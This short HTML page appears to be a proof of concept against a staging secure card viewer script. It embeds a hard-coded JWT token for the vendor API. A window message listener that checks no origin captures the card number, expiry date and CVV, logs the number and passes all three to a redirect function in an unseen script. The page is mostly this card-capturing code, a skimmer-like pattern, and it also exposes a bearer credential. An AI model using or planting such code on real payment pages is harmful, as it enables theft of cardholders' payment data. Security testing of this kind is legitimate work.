<!DOCTYPE html>

<html>
  <body>
    <div id="card-data">
      <div id="card-number"></div>
      <div id="card-expiry-date"></div>
      <div id="card-cvv"></div>
    </div>
  </body>
  <script
    src="https://api.staging.swapcards.com.br/beta_v3/secure-card-viewer/assets/swap.js"
    type="text/javascript"
  ></script>
  <script src="redirect.js" type="text/javascript"></script>
  <script>
    const getData = async () => {
      swap({
        token:
          "eyJhbGciOiJIUzI1NiIsImtpZCI6IjhCM0MzRDlFODVEN0ExQzE1OTQzREEzNzVGRTY0QkExIiwidHlwIjoiSldUIn0.eyJhdWQiOiJsb2NhbGhvc3Q6NDAwMC9jYXJkIiwiY2FyZF9pZCI6IjhCM0MzRDlFODVEN0ExQzE1OTQzREEzNzVGRTY0QkExIiwiZXhwIjoxNjkxNjkzMTg1LCJpYXQiOjE2OTE2OTI4ODUsImluZm8iOiJTZUJYd054bVhibzZ0UmcrREkzUUVTc1ZSempCenIzZkppM2lDRXFSOTZ5SU1TaVdNZlBJcFcvbVpBUXdpRlhVNUhMc1FpRHkwbjRZL1FHMllITnNBbmU5RkRTWkdJMTA5eE9SY243UERMbG9sdDIvaC83andrbmU0Q3FNNDBkdng4Zz0iLCJpc3MiOiJwY2lfaWZyYW1lX3N3YXAiLCJyZWFsbSI6InRyYW5zZmVybyIsInNlcnZpY2VfYXBpX2Jhc2VfdXJsIjoiaHR0cHM6Ly9hcGkuc3RhZ2luZy5zd2FwY2FyZHMuY29tLmJyIiwic3ViIjoiNzk0MDViZmUtNmM3Zi00OWNlLTk1M2YtYmRjZjExMWUzN2JlIiwidG9rZW5faWQiOjc5NH0.6Wgv9y6qbo-NldRLkevo2hnpllwj48ntCTxIXb8EfFA",
      });
      function handleMessage(message) {
        console.log(message.data.cardNumber);
        const cardNumber = message.data.cardNumber;
        const cardExpiryDate = message.data.cardExpiryDate;
        const cardCvv = message.data.cardCVV;
        redirect(cardNumber, cardExpiryDate, cardCvv);
      }
      window.addEventListener("message", handleMessage);
    };
    getData();
  </script>
</html>
